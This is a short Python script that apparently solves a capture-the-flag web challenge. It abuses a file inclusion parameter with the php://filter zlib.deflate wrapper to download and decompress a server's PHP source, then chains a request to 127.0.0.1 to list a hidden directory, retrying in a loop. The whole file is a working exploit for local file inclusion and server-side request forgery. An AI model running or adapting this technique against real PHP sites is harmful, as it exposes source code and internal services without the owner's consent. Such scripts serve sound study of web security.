#!/usr/bin/env python

import os, zlib, time
def unzlib(filename, out):
    f = open(filename, 'rb')
    decompressed_data = zlib.decompress(f.read(), -zlib.MAX_WBITS)
    f.close()
    f = open(out, 'wb')
    f.write(decompressed_data)
    f.close()


file1 = './tmp.zlib'
file2 = './ls.zlib'
out1 = 'index.php'
out2 = 'ls.txt'
os.system('curl "http://140.118.126.237:8890/?p=php://filter/zlib.deflate/resource=index.php" -o ' + file1)
unzlib(file1, out1)

while True:
    os.system('curl \'http://140.118.126.237:8890/?p=php://filter/zlib.deflate/resource=http%3A%2F%2F127.0.0.1%2F9GBz6DJ71S1JbPiHYI45.php%3Fdir%3Dfl4g_1n_th15_d1rect0ry_ju5t_0p3n_m3\' -o ' + file2)
    size = os.path.getsize(file2)
    if size != 2:
        print(size)
        break
    print('again')
    time.sleep(1)

unzlib(file2, out2)

